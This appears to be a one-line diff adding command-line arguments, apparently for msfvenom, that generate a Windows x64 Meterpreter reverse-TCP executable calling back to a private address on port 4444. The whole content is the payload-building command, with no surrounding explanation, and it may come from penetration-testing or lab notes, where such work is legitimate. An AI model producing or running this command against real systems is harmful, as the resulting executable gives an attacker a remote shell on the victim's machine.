@@ -1,0 +1,1 @@
+-p windows/x64/meterpreter/reverse_tcp LHOST=192.168.50.94 LPORT=4444 -f exe -o reverse_tcp_x64.exe
